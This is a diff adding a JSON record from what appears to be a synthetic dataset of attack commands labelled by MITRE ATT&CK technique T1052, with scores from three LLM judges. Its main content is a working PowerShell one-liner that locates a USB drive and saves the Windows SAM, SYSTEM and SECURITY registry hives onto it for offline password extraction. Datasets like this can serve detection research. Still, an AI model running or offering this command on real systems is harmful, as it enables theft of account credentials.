@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; reg.exe save HKLM\\SAM (Join-Path $usb 's.dat') /y & reg.exe save HKLM\\SYSTEM (Join-Path $usb 'sys.dat') /y & reg.exe save HKLM\\SECURITY (Join-Path $usb 'sec.dat') /y",
+  "explanation": "Saves critical registry hives directly to files on the removable drive, enabling offline exfiltration.",
+  "rationale_steps": [
+    "Determine removable drive path",
+    "Export SAM, SYSTEM, and SECURITY hives",
+    "Write hive files to USB for physical removal"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-7ff327f8",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced delimiters, valid cmdlets/arguments, proper concatenation and Join-Path usage, and acceptable use of ; and the call operator & to invoke subsequent commands.",
+        "semantic_score": 4,
+        "semantic_justification": "It correctly targets a removable drive and saves SAM, SYSTEM, and SECURITY hives for offline exfiltration (aligning with T1052), but in practice requires elevated privileges/SeBackupPrivilege so the stated 'Privilege: None' is unrealistic.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:06:46.974500Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced parentheses, correct variable assignment, proper piping, and valid reg.exe parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by identifying a removable drive, then saving critical registry hives (SAM, SYSTEM, SECURITY) to it for physical exfiltration, enabling offline password extraction.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:06:49.867039Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid PowerShell cmdlets, operators, and external executable syntax with balanced constructs and correct flag formats.",
+        "semantic_score": 1,
+        "semantic_justification": "The command fails to achieve its claimed intent because saving the HKLM\\SAM, HKLM\\SYSTEM, and HKLM\\SECURITY hives requires elevated privileges (Administrator or SYSTEM), contradicting the specified 'Privilege: None'.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:07:03.153937Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
